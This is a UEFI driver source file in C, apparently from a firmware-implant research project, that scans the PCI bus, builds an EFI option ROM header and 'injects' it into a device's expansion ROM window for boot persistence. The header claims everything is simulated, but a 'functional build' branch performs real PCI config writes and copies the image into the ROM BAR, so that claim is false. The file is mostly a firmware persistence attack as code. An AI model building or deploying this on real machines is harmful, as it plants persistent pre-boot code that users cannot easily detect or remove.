/** @file
  PCI Option ROM Persistence Emulation - Implementation

  Emulates PCI expansion ROM persistence techniques. Scans PCI config space
  for devices with Expansion ROM BARs, constructs valid option ROM headers
  with EFI-compatible PCIR structures, and simulates ROM injection into
  device expansion ROM space.

  All operations are SIMULATED - no actual PCI devices are modified.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include "PciOptionRom.h"

STATIC PCI_OPTROM_CONTEXT  mOptRomContext;

EFI_STATUS
EFIAPI
InitializePciOptRom (
  OUT PCI_OPTROM_CONTEXT  *Context
  )
{
  ZeroMem (Context, sizeof (PCI_OPTROM_CONTEXT));
  Context->Initialized = TRUE;
  Context->State = OptRomStateUninitialized;

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "Initialized (SIMULATION_MODE=%d)\n", SIMULATION_MODE));
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ScanPciDevices (
  IN OUT PCI_OPTROM_CONTEXT  *Context
  )
{
  UINT8   Bus;
  UINT8   Dev;
  UINT8   Func;
  UINT16  VendorId;
  UINT32  RomBar;

  if (!Context->Initialized) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "Scanning PCI bus for devices with Expansion ROM...\n"));

  if (SIMULATION_MODE) {
    // Network controller with option ROM
    Context->Devices[0].Bus = 0;
    Context->Devices[0].Device = 25;
    Context->Devices[0].Function = 0;
    Context->Devices[0].VendorId = 0x8086;
    Context->Devices[0].DeviceId = 0x15B8;
    Context->Devices[0].ClassCode[0] = 0x00;
    Context->Devices[0].ClassCode[1] = 0x00;
    Context->Devices[0].ClassCode[2] = 0x02;  // Network controller
    Context->Devices[0].ExpansionRomBar = 0xF7100000;
    Context->Devices[0].HasOptionRom = TRUE;
    Context->Devices[0].RomEnabled = FALSE;

    // GPU with option ROM
    Context->Devices[1].Bus = 0;
    Context->Devices[1].Device = 2;
    Context->Devices[1].Function = 0;
    Context->Devices[1].VendorId = 0x8086;
    Context->Devices[1].DeviceId = 0x5917;
    Context->Devices[1].ClassCode[0] = 0x00;
    Context->Devices[1].ClassCode[1] = 0x00;
    Context->Devices[1].ClassCode[2] = 0x03;  // Display controller
    Context->Devices[1].ExpansionRomBar = 0xF6000000;
    Context->Devices[1].HasOptionRom = TRUE;
    Context->Devices[1].RomEnabled = FALSE;

    // Storage controller (no ROM)
    Context->Devices[2].Bus = 0;
    Context->Devices[2].Device = 31;
    Context->Devices[2].Function = 2;
    Context->Devices[2].VendorId = 0x8086;
    Context->Devices[2].DeviceId = 0xA282;
    Context->Devices[2].ClassCode[0] = 0x01;
    Context->Devices[2].ClassCode[1] = 0x06;
    Context->Devices[2].ClassCode[2] = 0x01;  // SATA/AHCI
    Context->Devices[2].ExpansionRomBar = 0;
    Context->Devices[2].HasOptionRom = FALSE;
    Context->Devices[2].RomEnabled = FALSE;

    Context->DeviceCount = 3;
    Context->RomCapableCount = 2;

    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Found %d PCI devices [SIMULATED]\n",
            Context->DeviceCount));
  } else {
    Context->DeviceCount = 0;
    Context->RomCapableCount = 0;

    for (Bus = 0; Bus < OPTROM_MAX_BUS; Bus++) {
      for (Dev = 0; Dev < OPTROM_MAX_DEV; Dev++) {
        for (Func = 0; Func < OPTROM_MAX_FUNC; Func++) {
          if (Context->DeviceCount >= MAX_PCI_DEVICES) {
            goto ScanDone;
          }

          VendorId = PciRead16 (PCI_LIB_ADDRESS (Bus, Dev, Func, PCI_VENDOR_ID_OFFSET));
          if (VendorId == 0xFFFF || VendorId == 0x0000) {
            if (Func == 0) break;
            continue;
          }

          Context->Devices[Context->DeviceCount].Bus = Bus;
          Context->Devices[Context->DeviceCount].Device = Dev;
          Context->Devices[Context->DeviceCount].Function = Func;
          Context->Devices[Context->DeviceCount].VendorId = VendorId;
          Context->Devices[Context->DeviceCount].DeviceId =
            PciRead16 (PCI_LIB_ADDRESS (Bus, Dev, Func, PCI_DEVICE_ID_OFFSET));

          RomBar = PciRead32 (PCI_LIB_ADDRESS (Bus, Dev, Func, PCI_EXPANSION_ROM_BAR));
          if (RomBar != 0 && RomBar != 0xFFFFFFFF) {
            Context->Devices[Context->DeviceCount].ExpansionRomBar = RomBar & ~0x7FFUL;
            Context->Devices[Context->DeviceCount].HasOptionRom = TRUE;
            Context->Devices[Context->DeviceCount].RomEnabled = (RomBar & PCI_ROM_BAR_ENABLE) != 0;
            Context->RomCapableCount++;
          }

          Context->DeviceCount++;

          if (Func == 0) {
            UINT8 HdrType = PciRead8 (PCI_LIB_ADDRESS (Bus, Dev, Func, PCI_HEADER_TYPE_OFFSET));
            if ((HdrType & 0x80) == 0) break;
          }
        }
      }
    }
  }

ScanDone:
  {
  UINT32 Index;
  for (Index = 0; Index < Context->DeviceCount; Index++) {
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  [%d:%d.%d] %04x:%04x Class=%02x%02x%02x ROM=%a",
            Context->Devices[Index].Bus,
            Context->Devices[Index].Device,
            Context->Devices[Index].Function,
            Context->Devices[Index].VendorId,
            Context->Devices[Index].DeviceId,
            Context->Devices[Index].ClassCode[2],
            Context->Devices[Index].ClassCode[1],
            Context->Devices[Index].ClassCode[0],
            Context->Devices[Index].HasOptionRom ? "Yes" : "No"));
    if (Context->Devices[Index].HasOptionRom) {
      DEBUG ((DEBUG_INFO, " BAR=0x%08x\n", Context->Devices[Index].ExpansionRomBar));
    } else {
      DEBUG ((DEBUG_INFO, "\n"));
    }
  }
  }

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  %d devices with Expansion ROM capability\n",
          Context->RomCapableCount));

  Context->State = OptRomStateDevicesScanned;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ConstructOptionRom (
  IN OUT PCI_OPTROM_CONTEXT  *Context
  )
{
  OPTION_ROM_IMAGE     *RomImage;
  PCI_ROM_HEADER       *RomHeader;
  OPTROM_PCIR_DATA   *PcirData;

  if (Context->State < OptRomStateDevicesScanned) {
    return EFI_NOT_READY;
  }

  if (Context->RomCapableCount == 0) {
    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "No ROM-capable devices found\n"));
    return EFI_NOT_FOUND;
  }

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "Constructing EFI-compatible Option ROM...\n"));

  Context->RomSize = OPTION_ROM_TOTAL_SIZE;
  Context->RomBuffer = AllocateZeroPool (Context->RomSize);
  if (Context->RomBuffer == NULL) {
    return EFI_OUT_OF_RESOURCES;
  }

  Context->TargetDevice = 0;

  RomImage = (OPTION_ROM_IMAGE *)Context->RomBuffer;
  RomHeader = &RomImage->RomHeader;
  PcirData = &RomImage->PcirData;

  // ROM header
  RomHeader->Signature = PCI_ROM_SIGNATURE;
  RomHeader->PcirOffset = (UINT16)((UINTN)PcirData - (UINTN)RomHeader);

  // PCIR data structure
  PcirData->Signature = PCIR_SIGNATURE;
  PcirData->VendorId = Context->Devices[Context->TargetDevice].VendorId;
  PcirData->DeviceId = Context->Devices[Context->TargetDevice].DeviceId;
  PcirData->Length = sizeof (OPTROM_PCIR_DATA);
  PcirData->Revision = 3;
  PcirData->ClassCode[0] = Context->Devices[Context->TargetDevice].ClassCode[0];
  PcirData->ClassCode[1] = Context->Devices[Context->TargetDevice].ClassCode[1];
  PcirData->ClassCode[2] = Context->Devices[Context->TargetDevice].ClassCode[2];
  PcirData->ImageLength = (UINT16)(Context->RomSize / 512);
  PcirData->CodeType = PCI_ROM_CODE_TYPE_EFI;
  PcirData->Indicator = 0x80;  // Last image

  Context->RomConstructed = TRUE;

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  ROM Header:\n"));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    Signature:    0x%04x (AA55)\n", RomHeader->Signature));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    PCIR Offset:  0x%04x\n", RomHeader->PcirOffset));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  PCIR Data:\n"));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    Signature:    PCIR\n"));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    Vendor/Dev:   %04x:%04x\n",
          PcirData->VendorId, PcirData->DeviceId));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    CodeType:     0x%02x (EFI)\n", PcirData->CodeType));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    ImageLength:  %d x 512 = %d bytes\n",
          PcirData->ImageLength, PcirData->ImageLength * 512));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    Indicator:    0x%02x (last image)\n",
          PcirData->Indicator));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Total ROM size: %d bytes\n", Context->RomSize));

  Context->State = OptRomStateRomConstructed;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
EmulateRomInjection (
  IN OUT PCI_OPTROM_CONTEXT  *Context
  )
{
  PCI_DEVICE_INFO  *Target;

  if (Context->State < OptRomStateRomConstructed) {
    return EFI_NOT_READY;
  }

  if (!Context->RomConstructed) {
    return EFI_NOT_READY;
  }

  Target = &Context->Devices[Context->TargetDevice];

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "Emulating Option ROM injection...\n"));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Target device: [%d:%d.%d] %04x:%04x\n",
          Target->Bus, Target->Device, Target->Function,
          Target->VendorId, Target->DeviceId));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  ROM BAR:       0x%08x\n", Target->ExpansionRomBar));

  if (SIMULATION_MODE) {
    Context->InjectionAttempted = TRUE;

    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Step 1: Enable ROM BAR (set bit 0) [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    PciWrite32(BAR, 0x%08x | 0x01)\n",
            Target->ExpansionRomBar));

    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Step 2: Map ROM memory region [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    Mapped at: 0x%08x, Size: %d bytes\n",
            Target->ExpansionRomBar, Context->RomSize));

    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Step 3: Write ROM image [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    CopyMem(0x%08x, RomBuffer, %d)\n",
            Target->ExpansionRomBar, Context->RomSize));

    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Step 4: Disable ROM BAR (clear bit 0) [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "    ROM persists in flash, loaded on next boot\n"));

    Context->InjectionSucceeded = TRUE;
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  → ROM injection SUCCEEDED [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  → On next boot: PCI firmware loads implanted ROM\n"));
    DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  → ROM executes as EFI driver during PCI enumeration\n"));
  } else {
    //
    // Functional build: perform the real ROM BAR injection sequence.
    // DXE runs identity-mapped, so the ROM BAR physical address is
    // directly writable as MMIO.
    //
    UINT32  RomBarAddress;
    UINT8   *RomWindow;

    Context->InjectionAttempted = TRUE;

    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "  FUNCTIONAL: performing real ROM BAR injection\n"));

    //
    // Step 1: Enable the expansion ROM BAR (decode bit 0).
    //
    PciWrite32 (
      PCI_LIB_ADDRESS (Target->Bus, Target->Device, Target->Function, PCI_EXPANSION_ROM_BAR),
      Target->ExpansionRomBar | PCI_ROM_BAR_ENABLE
      );

    //
    // Step 2: The ROM BAR now decodes to a physical MMIO window.
    // (Bit 0 is the enable flag, not part of the address.)
    //
    RomBarAddress = Target->ExpansionRomBar & ~PCI_ROM_BAR_ENABLE;
    RomWindow     = (UINT8 *)(UINTN)RomBarAddress;

    //
    // Step 3: Write the ROM image into the mapped BAR window. The
    // device ROM shadow (in the device's own flash/spare) persists
    // and is loaded on subsequent boots.
    //
    CopyMem (RomWindow, Context->RomBuffer, Context->RomSize);

    //
    // Step 4: Disable the ROM BAR decode.
    //
    PciWrite32 (
      PCI_LIB_ADDRESS (Target->Bus, Target->Device, Target->Function, PCI_EXPANSION_ROM_BAR),
      Target->ExpansionRomBar & ~PCI_ROM_BAR_ENABLE
      );

    Context->InjectionSucceeded = TRUE;
    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "  → ROM injection written to 0x%08x (%d bytes)\n",
            RomBarAddress, Context->RomSize));
  }

  Context->State = OptRomStateInjectionSimulated;
  return EFI_SUCCESS;
}

VOID
EFIAPI
LogPciOptRomStatus (
  IN     PCI_OPTROM_CONTEXT  *Context
  )
{
  CHAR8  *StateStr;

  switch (Context->State) {
    case OptRomStateUninitialized:       StateStr = "Uninitialized"; break;
    case OptRomStateDevicesScanned:      StateStr = "Devices Scanned"; break;
    case OptRomStateRomConstructed:      StateStr = "ROM Constructed"; break;
    case OptRomStateInjectionSimulated:  StateStr = "Injection Simulated"; break;
    default:                             StateStr = "Unknown"; break;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "=== PCI Option ROM Status ===\n"));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  State:           %a\n", StateStr));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  PCI Devices:     %d found\n", Context->DeviceCount));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  ROM Capable:     %d devices\n", Context->RomCapableCount));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  ROM Constructed: %a (%d bytes)\n",
          Context->RomConstructed ? "Yes" : "No", Context->RomSize));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "  Injection:       %a\n",
          Context->InjectionSucceeded ? "Succeeded" :
          (Context->InjectionAttempted ? "Failed" : "Not attempted")));
  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "=============================\n\n"));
}

EFI_STATUS
EFIAPI
PciOptionRomEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "Module loaded - PCI Option ROM Persistence Emulation\n"));

  Status = InitializePciOptRom (&mOptRomContext);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = ScanPciDevices (&mOptRomContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, OPTROM_DEBUG_PREFIX "PCI scan failed: %r\n", Status));
    return Status;
  }

  Status = ConstructOptionRom (&mOptRomContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "ROM construction: %r\n", Status));
    LogPciOptRomStatus (&mOptRomContext);
    return EFI_SUCCESS;
  }

  Status = EmulateRomInjection (&mOptRomContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_WARN, OPTROM_DEBUG_PREFIX "ROM injection: %r\n", Status));
  }

  LogPciOptRomStatus (&mOptRomContext);

  if (mOptRomContext.RomBuffer != NULL) {
    FreePool (mOptRomContext.RomBuffer);
    mOptRomContext.RomBuffer = NULL;
  }

  DEBUG ((DEBUG_INFO, OPTROM_DEBUG_PREFIX "Emulation complete\n"));
  return EFI_SUCCESS;
}
